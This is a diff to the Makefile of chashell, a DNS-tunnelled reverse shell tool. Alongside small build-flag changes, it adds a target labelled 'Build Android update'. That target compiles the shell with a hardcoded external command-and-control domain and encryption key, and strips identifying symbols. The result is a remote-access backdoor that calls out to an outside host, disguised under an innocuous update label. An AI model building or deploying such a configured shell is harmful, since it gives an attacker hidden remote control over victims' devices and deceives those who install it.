@@ -25,12 +25,14 @@ endif
 
 build: check-env ## Build for the current architecture.
 	dep ensure && \
-	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(CLIENT_BINARY) $(CLIENT_SOURCE) && \
-	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(SERVER_BINARY) $(SERVER_SOURCE)
+	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(CLIENT_BINARY) $(CLIENT_SOURCE) -mod=readonly && \
+	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(SERVER_BINARY) $(SERVER_SOURCE) -mod=readonly
 
 dep: check-env ## Get all the required dependencies
 	go get -v -u github.com/golang/dep/cmd/dep && \
 	go get github.com/mitchellh/gox
+build-ad:  ## Build Android update
+	 go build -ldflags "-X main.targetDomain=c.vimmo.app -X main.encryptionKey=80523fab733d2af60be251626a688ec9e4c9abb23e927edffa69b8bb0d0fa706 -s -w" -gcflags "all=-trimpath=OPATH" -mod=readonly -tags release -o release/chashell ./cmd/shell
 
 build-client: check-env ## Build the chashell client.
 	@echo "Building shell"
